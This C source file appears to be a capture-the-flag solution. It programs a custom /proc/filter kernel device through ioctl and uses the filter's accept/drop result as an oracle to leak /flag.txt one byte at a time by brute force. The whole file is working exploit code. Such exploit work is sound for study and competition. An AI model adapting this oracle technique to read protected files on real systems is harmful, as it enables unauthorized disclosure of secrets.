#include <assert.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>

#define MAGIC 'f'
#define PROGRAM (0x40086601)
#define EXECUTE (0x40086602)

struct program {
    uint8_t *code;
    uint64_t len;
};

#define MAX_INPUT_SIZE 256

enum operation : uint8_t {
    // Exit conditions
    OP_ACCEPT = 0,
    OP_DROP = 1,

    // cmp
    OP_CMP_IMM = 23,

    // if ==
    OP_BEQ_IMM = 29,

    // load byte
    OP_LDB_IMM = 43,
};

struct instruction {
    enum operation op;
    struct {
        uint8_t reg0 : 4;
        uint8_t reg1 : 4;
    };
    uint16_t imm;
};

#define INSN_LDB_IMM(REG0, IMM)                                                \
    ((struct instruction){                                                     \
        .op = OP_LDB_IMM, .reg0 = REG0, .reg1 = 0, .imm = IMM})

#define INSN_CMP_IMM(REG0, IMM)                                                \
    ((struct instruction){                                                     \
        .op = OP_CMP_IMM, .reg0 = REG0, .reg1 = 0, .imm = IMM})

#define INSN_BEQ_IMM(IMM)                                                      \
    ((struct instruction){.op = OP_BEQ_IMM, .reg0 = 0, .reg1 = 0, .imm = IMM})

#define INSN_ACCEPT()                                                          \
    ((struct instruction){.op = OP_ACCEPT, .reg0 = 0, .reg1 = 0, .imm = 0})

#define INSN_DROP()                                                            \
    ((struct instruction){.op = OP_DROP, .reg0 = 0, .reg1 = 0, .imm = 0})

bool check_byte(int fd, uint16_t i, uint8_t n);

int main() {
    puts("Opening /proc/filter");
    int fd = open("/proc/filter", 0);
    assert(fd >= 0);

    bool correct;
    char flag[MAX_INPUT_SIZE] = {};

    puts("Leaking flag");
    for (uint16_t i = 0; i < MAX_INPUT_SIZE; i++) {
        for (char n = '!'; n <= '~'; n++) {
            printf("%s%c\r", flag, n);

            correct = check_byte(fd, i, n);
            if (correct) {
                flag[i] = n;
                if (n == '}') {
                    goto endloop;
                }
                goto next;
            }
        }

        printf("Could not find byte at idx %i\n", i);
        abort();

    next:
        continue;
    }

endloop:
    printf("\nGot flag %s\n", flag);
}

// Check if flag[i] == n
bool check_byte(int fd, uint16_t i, uint8_t n) {
    // Create the program
    const uint8_t r0 = 0;
    struct instruction code[] = {
        INSN_LDB_IMM(r0, i), // 0. ldb r0, [i]
        INSN_CMP_IMM(r0, n), // 1. cmp r0, n
        INSN_BEQ_IMM(4),     // 2. if eq goto 4
        INSN_ACCEPT(),       // 3. accept
        INSN_DROP(),         // 4. drop
    };
    struct program program = {
        .code = (uint8_t *)code,
        .len = sizeof(code),
    };

    // Send the program
    int result = ioctl(fd, PROGRAM, &program);
    if (result < 0) {
        perror("ioctl PROGRAM failed");
        abort();
    }

    // Execute the program
    result = ioctl(fd, EXECUTE, "/flag.txt");
    if (result < 0) {
        perror("ioctl EXECUTE failed");
        abort();
    }

    if (result > 2) {
        printf("Invalid bool %d result\n", result);
        abort();
    }

    return result;
}
